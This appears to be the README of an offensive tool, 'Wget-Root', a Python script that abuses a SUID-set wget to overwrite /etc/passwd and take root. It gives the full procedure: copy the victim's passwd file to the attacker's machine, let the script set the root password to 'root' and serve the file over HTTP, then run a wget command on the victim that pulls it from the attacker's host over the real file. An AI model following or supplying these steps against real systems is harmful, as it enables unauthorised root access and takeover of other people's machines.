# Wget-Root

This is a python script that exploits wget when being set with a SUID bit, and overwrites the root password.

# Usage
From the victims shell, copy the /etc/passwd file to your host machine. (Be carefull and do not overwrite your own passwd file)
```bash
python3 wget_exploit --file <passwd copy> --port <webserver port>
```
The script will overwrite the <passwd copy> file, containing the changed `root` password. 
Then it will host the passwd file to the web using a python http server.
Run the command `sudo wget http://<host ip>:<webserver port>/` on the victims shell to overwrite the passwd file.
**Congratulations!** Now switch users to `root` with the password `root`
